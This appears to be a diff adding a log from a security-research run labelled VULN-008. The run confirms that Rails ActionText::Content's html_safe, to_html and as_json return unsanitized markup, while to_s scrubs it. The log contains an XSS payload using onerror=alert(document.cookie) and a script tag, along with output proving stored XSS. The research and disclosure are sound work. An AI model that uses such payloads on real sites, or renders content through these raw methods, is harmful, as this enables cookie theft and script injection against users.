@@ -1,0 +1,19 @@
+========================================================================
+VULN-008: ActionText::Content#html_safe/#to_html/#as_json return unsanitized markup
+target : http://localhost:27966
+========================================================================
+[INFO] exercising vulnerable code path: ActionText::Content#to_html (raw fragment) vs #to_s (sanitize-on-render)
+[SETUP] rich-text payload under test: <p>hi</p><img src=x onerror=alert(document.cookie)><script>alert(1)</script>
+[STEP] comparing to_s (render path) vs html_safe/to_html/as_json on the real ActionText::Content
+[INFO] @@to_s script=false onerror=false
+[INFO] @@html_safe script=true onerror=true is_html_safe=true
+[INFO] @@to_html script=true onerror=true
+[INFO] @@as_json script=true onerror=true
+[INFO] @@sample to_s="<div class=\"trix-content\">\n  <p>hi</p><img src=\"x\">alert(1)\n</div>\n"
+[INFO] @@sample html_safe="<p>hi</p><img src=\"x\" onerror=\"alert(document.cookie)\"><script>alert(1)</script>"
+[INFO] @@done
+[PROOF] to_s (the <%= content %> path) SCRUBBED both <script> and onerror — the idiomatic path is safe
+[PROOF] html_safe returned the <script> and onerror VERBATIM, flagged html_safe? = true — the 'safe'-named method emits XSS-capable markup without escaping
+[PROOF] to_html and as_json also return the raw, unsanitized markup (extends the trap to JSON APIs)
+[OK] exploit confirmed — ActionText::Content#html_safe/#to_html/#as_json return unsanitized rich text while #to_s sanitizes; rendering stored content via the footgun path yields stored XSS
+==> VULN-008: CONFIRMED — html_safe/to_html/as_json return unsanitized rich text (stored XSS when an app renders via that path)
